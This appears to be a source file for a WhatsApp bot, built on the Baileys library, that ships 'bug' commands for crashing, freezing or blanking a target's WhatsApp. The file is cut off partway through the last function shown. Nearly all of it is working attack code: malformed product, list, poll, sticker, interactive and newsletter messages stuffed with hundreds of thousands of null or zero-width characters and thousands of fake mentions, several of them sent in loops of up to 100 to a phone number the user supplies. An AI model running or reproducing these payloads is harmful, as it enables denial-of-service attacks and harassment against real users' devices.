const { cmd } = require('../command');
const crypto = require('crypto');
const axios = require('axios');
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

// fallback for different Baileys versions
if (!generateWAMessageFromContent) {
    try { 
        const baileys = require('@adiwajshing/baileys');
        generateWAMessageFromContent = baileys.generateWAMessageFromContent;
        proto = baileys.proto;
    } catch(e) {}
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Helper: download image from URL (for menu)
async function getImageBuffer(url) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        return Buffer.from(response.data);
    } catch (error) {
        return null;
    }
}

// Helper: validate target number
function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== ULTRA .bug (100 mixed payloads + 3 extreme killers) ====================
async function ttaas(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(90000),
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };

    for (let i = 0; i < 100; i++) {
        // Product
        const productMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    productMessage: {
                        product: {
                            productImage: imageMessage,
                            productId: "449756950375071",
                            title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(50000),
                            description: "MY Bad" + "\u2060".repeat(60000),
                            priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
                            url: "wa.me/status",
                            productImageCount: 9999999,
                            firstImageId: "9999999999",
                            salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
                        },
                        businessOwnerJid: "13135550002@s.whatsapp.net"
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, productMsg.message, {});

        // Interactive
        const interactiveMsg = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: { title: "\u0000".repeat(90000), hasMediaAttachment: true },
                body: { text: "\u2060".repeat(80000) },
                footer: { text: "\u0000".repeat(90000) },
                nativeFlowMessage: { messageParamsJson: "\u0000".repeat(1500000) },
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                }
            }
        }, {});
        await conn.relayMessage(target, interactiveMsg.message, {});

        // List
        const listMsg = generateWAMessageFromContent(target, {
            listMessage: {
                title: "🔥 CRASH 🔥" + "\u0000".repeat(920000),
                footerText: "Xeon Bug" + "\u2060".repeat(50000),
                description: "Xeon Bug" + "\u0000".repeat(50000),
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }],
                    businessOwnerJid: "0@s.whatsapp.net"
                }
            }
        }, {});
        await conn.relayMessage(target, listMsg.message, {});

        // Location
        const locationMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: "p".repeat(50000),
                        degreesLongitude: "p".repeat(50000),
                        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(80000),
                        sequenceNumber: "0",
                        jpegThumbnail: ""
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, locationMsg.message, {});

        // Sticker
        const stickerMsg = generateWAMessageFromContent(target, {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                mimetype: "image/webp",
                fileLength: "9999999999999999999",
                isAnimated: false,
                contextInfo: { mentionedJid: [target, ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
            }
        }, {});
        await conn.relayMessage(target, stickerMsg.message, {});
    }
}

async function extremeKillers(conn, target) {
    // Poll crash
    const pollMsg = generateWAMessageFromContent(target, {
        pollCreationMessage: {
            name: "⚠️ SYSTEM ERROR ⚠️" + "A".repeat(200000),
            options: [
                { optionName: "⛔" + "B".repeat(300000) },
                { optionName: "💀" + "C".repeat(300000) }
            ],
            selectableOptionsCount: 1,
            pollType: "QUIZ",
            correctAnswer: { optionName: "💀" + "C".repeat(300000) },
            contextInfo: { isGroupStatus: false }
        }
    }, {});
    await conn.relayMessage(target, pollMsg.message, {});

    // Interactive bomb
    const interactiveMsg = generateWAMessageFromContent(target, {
        interactiveMessage: {
            header: { title: "\u0000".repeat(200000), hasMediaAttachment: true },
            body: { text: "\u2060".repeat(200000) },
            footer: { text: "\u0000".repeat(200000) },
            nativeFlowMessage: { messageParamsJson: "\u0000".repeat(2000000) },
            contextInfo: {
                mentionedJid: Array.from({ length: 3000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
            }
        }
    }, {});
    await conn.relayMessage(target, interactiveMsg.message, {});

    // List bomb
    const sections = [];
    for (let i = 0; i < 50; i++) {
        sections.push({
            title: "X".repeat(50000),
            rows: [{ title: "Y".repeat(50000), rowId: "Z".repeat(50000) }]
        });
    }
    const listMsg = generateWAMessageFromContent(target, {
        listMessage: {
            title: "🔥 CRASH 🔥" + "\u0000".repeat(1500000),
            footerText: "\u2060".repeat(100000),
            description: "\u2063".repeat(100000),
            buttonText: null,
            listType: 2,
            sections: sections,
            productListInfo: {
                productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }],
                businessOwnerJid: "0@s.whatsapp.net"
            }
        }
    }, {});
    await conn.relayMessage(target, listMsg.message, {});
}

// ==================== INVISIBLE CRASH (.shavi-invis) ====================
async function invisibleCrash(conn, target) {
    const msg1 = generateWAMessageFromContent(target, {
        interactiveMessage: {
            header: { locationMessage: { degreesLatitude: 9999999, degreesLongitude: 9999999 }, hasMediaAttachment: true },
            body: { text: '\u2060'.repeat(1200000) },
            nativeFlowMessage: { messageParamsJson: '\u0000'.repeat(2000000) },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
            }
        }
    }, {});
    await conn.relayMessage(target, msg1.message, {});

    const msg2 = generateWAMessageFromContent(target, {
        ephemeralMessage: {
            message: {
                extendedTextMessage: {
                    text: '\u2063'.repeat(800000),
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1500 }, () => `2${Math.floor(Math.random() * 8000000)}@s.whatsapp.net`),
                        stanzaId: '\u0000'.repeat(50000)
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg2.message, {});
}

// ==================== PROTOCOL 10 (video spam) ====================
async function protocolbug10(conn, target, mention = false) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };
    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [{ embeddedContent: { embeddedMusic }, embeddedAction: true }]
    };
    for (let i = 0; i < 100; i++) {
        const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
        await conn.relayMessage(target, msg.message, {});
        if (mention) {
            await conn.relayMessage(target, {
                groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } }
            }, {});
        }
        if (i < 99) await sleep(100); // optional delay to avoid rate limit
    }
}

// ==================== PAYDOX (multiple payloads) ====================
async function paydox(conn, target, Ptcp = true) {
    const Crash = '𐧙'.repeat(10500);
    const Anjay = 'ꦽ'.repeat(55555);
    const mentionJid = target;
    const payloads = [
        { locationMessage: { degreesLatitude: 999999999, degreesLongitude: 999999999, name: Crash, address: Anjay, jpegThumbnail: Buffer.alloc(0) } },
        { paymentInviteMessage: { currencyCodeIso4217: 'USD', amount1000: 999999999, requestFrom: mentionJid, noteMessage: { extendedTextMessage: { text: Crash, title: Anjay, matchedText: 'Yukina Love Dimxz', canonicalUrl: 'https://wa.me/' + mentionJid.replace(/@.*/, '') } } } },
        { extendedTextMessage: { text: Crash, title: Crash, matchedText: Anjay, canonicalUrl: 'https://t.me/Dimzxzzx', description: Crash, jpegThumbnail: Buffer.alloc(0) } },
        { orderMessage: { orderId: '999999999', orderImage: { url: 'https://t.me/yukinadevils', mimetype: 'image/jpeg', fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"), fileLength: '999999', height: 500, width: 500 }, itemCount: 999999, status: 1, surface: 1, orderTitle: Crash, sellerJid: mentionJid, token: Buffer.from("bwwbcbbjan"), totalAmount1000: 999999999, currencyCode: 'USD', contextInfo: { mentionedJid: [mentionJid] } } },
        { interactiveMessage: { header: { documentMessage: { url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4', mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileSha256: Buffer.from("ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=", "base64"), fileLength: "999999999", pageCount: 0x9184e729fff, mediaKey: Buffer.from("5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", "base64"), fileName: "Fuck You", fileEncSha256: Buffer.from("pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=", "base64"), directPath: '/v/t62.7119-24/30578306...', mediaKeyTimestamp: "1715880173", contactVcard: true }, title: "☀️", hasMediaAttachment: true }, body: { text: "XP STORM ☀️" + Anjay + Crash }, nativeFlowMessage: { buttons: [ { name: 'call_permission_request', buttonParamsJson: '{}' } ] }, contextInfo: { quotedMessage: { interactiveResponseMessage: { body: { text: "Sent", format: "DEFAULT" }, nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: `{"screen_2_OptIn_0":true,"screen_2_OptIn_1":true,"screen_1_Dropdown_0":"Domzxzzx","screen_1_DatePicker_1":"1028995200000","screen_1_TextInput_2":"cyber@gmail.com","screen_1_TextInput_3":"94643116","screen_0_TextInput_0":"radio - buttons${"\u0003".repeat(1020000)}","screen_0_TextInput_1":"Why?","screen_0_Dropdown_2":"001-Grimgar","screen_0_RadioButtonsGroup_3":"0_true","flow_token":"AQAAAAACS5FpgQ_cAAAAAE0QI3s."}`, version: 3 } } } } } },
        { newsletterAdminInviteMessage: { newsletterJid: `120363298524333143@newsletter`, newsletterName: "MAK LOE MATE" + "@1".repeat(60000) + "\u0000".repeat(920000), jpegThumbnail: null, caption: `XP STORM`, inviteExpiration: Date.now() + 1814400000 } }
    ];
    for (let i = 0; i < payloads.length; i++) {
        const wrapped = { viewOnceMessage: { message: payloads[i], contextInfo: { mentionedJid: [mentionJid], forwardingScore: 999, isForwarded: true } } };
        await conn.relayMessage(target, wrapped, { messageId: conn.generateMessageTag?.() || Date.now().toString(), ...(Ptcp ? { participant: { jid: target } } : {}) });
    }
}

// ==================== EXTRA KUOTA ====================
async function extrakuota(conn, target) {
    const hell = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "kontol", format: "DEFAULT" },
                    nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "\u0000".repeat(1045000), version: 3 }
                }
            }
        }
    }, { ephemeralExpiration: 0, forwardingScore: 0, isForwarded: false, font: Math.floor(Math.random() * 9), background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0") });
    await conn.relayMessage(target, hell.message, {});
    await conn.relayMessage(target, { statusMentionMessage: { message: { protocolMessage: { key: hell.key, type: 25 } } } }, {});
    const message = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                    mimetype: "image/webp",
                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: { mentionedJid: [ "0@s.whatsapp.net", ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net") ], groupMentions: [], entryPointConversionSource: "non_contact", entryPointConversionApp: "whatsapp", entryPointConversionDelaySeconds: 467593 },
                    stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                    isAvatar: false, isAiSticker: false, isLottie: false
                }
            }
        }
    };
    const msg = generateWAMessageFromContent(target, message, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== BLANK UI FUNCTIONS (separate commands) ====================
async function invico1(conn, target) {
    const msg = { newsletterAdminInviteMessage: { newsletterJid: "120363321780343299@newsletter", newsletterName: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000), caption: "⎋𝐅𝐢̸̷̷̷̋͜͢͜͢͠͡͡𝐍𝐈𝐗͜͢-‣" + "ោ៝".repeat(10000), inviteExpiration: "999999999" } };
    await conn.relayMessage(target, msg, { participant: { jid: target } });
}
async function Uinew(conn, target) {
    const ameliaMsg = {
        interactiveMessage: {
            body: { text: "AMELIA KILL YOU 👿" + "ꦾ".repeat(80000) + "~@1~".repeat(40000) },
            footer: { text: "AMELIA KILL YOU 👿" + "\u200B".repeat(50000) },
            header: { title: "https://amelia_overload" + "ꦾ".repeat(80000) + "~@1~".repeat(40000), subtitle: "\u200B", hasMediaAttachment: true, locationMessage: { degreesLatitude: 0, degreesLongitude: 0, name: "amelia", address: "" } },
            nativeFlowMessage: { buttons: Array(5).fill().map((_, idx) => ({ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "X", id: `amelia${idx+6}` }) })) }
        }
    };
    await conn.relayMessage(target, ameliaMsg, {});
}
async function uiKiller(conn, target) {
    await conn.relayMessage(target, {
        locationMessage: {
            degreesLongitude: 0, degreesLatitude: 0,
            name: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000),
            url: "https://Amelia." + "ི꒦ྀ".repeat(9000) + ".id",
            address: "⃞⃟⃤⃟⃟𝐀 / 𝐇𝐞𝐥𝐥𝐛𝐨𝐲 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮 ⃟⃤⃞⃟⃝" + "ི꒦ྀ".repeat(9000),
            contextInfo: { externalAdReply: { renderLargerThumbnail: true, showAdAttribution: true, body: "Amelia-Hellboy Kill You", title: "ི꒦ྀ".repeat(9000), sourceUrl: "https://Amelia." + "ི꒦ྀ".repeat(9000) + ".id", thumbnailUrl: null, quotedAd: { advertiserName: "ི꒦ྀ".repeat(9000), mediaType: 2, jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", caption: "-( AMA )-" }, pleaceKeyHolder: { remoteJid: "0@s.whatsapp.net", fromMe: false, id: "ABCD1234567" } } }
        }
    }, {});
}
async function frezeui(conn, target) {
    await conn.relayMessage(target, {
        viewOnceMessage: {
            message: {
                buttonsMessage: {
                    text: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
                    contentText: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "ꦽ".repeat(7000),
                    contextInfo: { forwardingScore: 6, isForwarded: true, urlTrackingMap: { urlTrackingMapElements: [ { originalUrl: "https://t.me/vibracoess", unconsentedUsersUrl: "https://t.me/vibracoess", consentedUsersUrl: "https://t.me/vibracoess", cardIndex: 1 }, { originalUrl: "https://t.me/vibracoess", unconsentedUsersUrl: "https://t.me/vibracoess", consentedUsersUrl: "https://t.me/vibracoess", cardIndex: 2 } ] }, quotedMessage: { interactiveResponseMessage: { body: { text: "🦠", format: "EXTENSIONS_1" }, nativeFlowResponseMessage: { name: "address_message", paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"xrl\",\"tower_number\":\"relly\",\"city\":\"markzuckerberg\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`, version: 3 } } } },
                    headerType: 1
                }
            }
        }
    }, {});
}
async function ForceXsystem(conn, target) {
    const message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                    contextInfo: { mentionedJid: [target], isForwarded: true, forwardingScore: 99999999, businessMessageForwardInfo: { businessOwnerJid: target } },
                    body: { text: "Tiada Hidup Dengan Kebahagiaan" + "ꦾ".repeat(35000) },
                    nativeFlowMessage: { messageParamsJson: "{".repeat(15000), buttons: [ "single_select", "call_permission_request", "cta_url", "cta_call", "cta_copy", "cta_reminder", "cta_cancel_reminder", "address_message", "send_location", "quick_reply", "mpm" ].map(name => ({ name, ParamsJson: "{".repeat(15000), version: 3 })) }
                }
            }
        }
    };
    await conn.relayMessage(target, message, { participant: { jid: target } });
}
async function FrezeXblank(conn, target) {
    for (let i = 0; i < 100; i++) {
        const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
            interactiveMessage: {
                contextInfo: { mentionedJid: [target], isForwarded: true, forwardingScore: 999, forwardedNewsletterMessageInfo: { newsletterJid: "120363399013145023@newsletter", newsletterName: "https://amelia.overload", serverMessageId: 1 } },
                header: { title: "", hasMediaAttachment: false },
                body: { text: "HAII SAVE AMELIA" },
                footer: { text: "" },
                nativeFlowMessage: {
                    buttons: [
                        { name: "single_select", buttonParamsJson: `{"title":"${"ꦾ".repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}` },
                        { name: "galaxy_message", buttonParamsJson: JSON.stringify({ "screen_1_TextInput_0": "radio - buttons" + "\0".repeat(10000), "screen_0_Dropdown_1": "Null", "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s." }), version: 3 }
                    ]
                }
            }
        }), { userJid: target });
        await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
        await sleep(10);
    }
}
async function BlankUi(conn, target) {
    const Amelia = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { hasMediaAttachment: true, imageMessage: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg?mms3=true", directPath: "/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg", mimetype: "image/jpeg", width: 99999999999999, height: 99999999999999, fileLength: 9999999999999, fileSha256: "1KOUrmLddsr6o9UL5rTte7SXgo/AFcsqSz3Go+noF20=", fileEncSha256: "3VSRuGlV95Aj9tHMQcUBgYR6Wherr1sT/FAAKbSUJ9Y=", mediaKeyTimestamp: 1753804634, mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" } },
                    body: { text: "𝗔𝗠𝗘𝗟𝗜𝗔 𝗞𝗜𝗟𝗟 𝗬𝗢𝗨👿" + "ꦽ".repeat(50000) },
                    contextInfo: { participant: target, mentionedJid: [ "0@s.whatsapp.net", ...Array.from({ length: 700 }, () => "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net") ] },
                    nativeFlowMessage: { buttons: [ { name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) }, { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) }, { name: "cta_call", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) }, { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(50000) }) } ], messageParamsJson: "{".repeat(10000) }
                }
            }
        }
    };
    await conn.relayMessage(target, Amelia, { participant: { jid: target } });
}
async function uiblank(conn, target) {
    await conn.relayMessage(target, {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Amelia Kill You " + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱".repeat(100),
                    description: "؄؂؂؀؁ب".repeat(18000),
                    listType: 1,
                    singleSelectReply: { selectedRowId: "3 Collabs" }
                }
            }
        }
    }, { ephemeralExpiration: 5, timeStamp: Date.now() });
}
async function newsletterSqL(conn, target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "1@newsletter",
                        newsletterName: "",
                        jpegThumbnail: null,
                        caption: "ꦾ".repeat(60000),
                        inviteExpiration: Date.now() + 9999999999
                    }
                }
            },
            nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
            contextInfo: { remoteJid: target, participant: target, stanzaId: Date.now().toString() }
        };
        await conn.relayMessage(target, message, { userJid: target });
    } catch (error) { console.log(error); }
}
async function bak2(conn, target) {
    await conn.relayMessage(target, {
        ephemeralMessage: {
            message: {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: "ijin mintol" + "ꦾ".repeat(90000) },
                            carouselMessage: {
                                cards: [{
                                    header: { hasMediaAttachment: false },
                                    body: { text: "bang ijin puskon" + "ꦾ".repeat(90000) },
                                    nativeFlowMessage: {
                                        buttons: [
                                            { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "@6285789034010", url: "https://t.me/YukinaDevils", merchant_url: "https://t.me/YukinaDevils" }) },
                                            { name: "single_select", buttonParamsJson: JSON.stringify({ title: "@6285789034010", sections: [ { title: "@6285789034010", rows: [] } ] }) },
